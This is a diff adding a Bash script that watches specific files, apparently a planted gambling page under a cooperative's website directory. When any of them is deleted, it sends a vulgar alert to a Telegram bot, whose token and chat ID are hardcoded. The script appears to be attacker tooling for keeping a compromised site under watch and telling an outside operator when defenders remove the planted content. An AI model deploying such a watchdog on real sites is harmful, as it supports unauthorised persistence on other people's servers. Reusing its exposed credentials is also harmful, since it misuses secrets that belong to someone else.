@@ -1,0 +1,35 @@
+#!/bin/bash
+
+# File yang akan dilindungi
+protected_files=(
+    "/home/u0256282/public_html/kopkarlia.com/iboslot/index.php"
+    "index.php"
+    # Tambahkan file lain sesuai kebutuhan
+)
+
+# Token dan ID chat Telegram
+TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
+CHAT_ID="7234811259"
+USER_NAME="@username99qiwi"
+
+# Fungsi untuk mengirim notifikasi ke Telegram
+send_telegram_notification() {
+    local message="$1"
+    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+        -d chat_id="$CHAT_ID" \
+        -d text="$message"
+}
+
+# Memantau file menggunakan inotifywait
+monitor_files() {
+    for file in "${protected_files[@]}"; do
+        inotifywait -m -e delete_self --format '%f' "$file" |
+        while read deleted_file; do
+            send_telegram_notification "Hilang kntl: $deleted_file"
+        done &
+    done
+    wait
+}
+
+# Jalankan fungsi monitor
+monitor_files
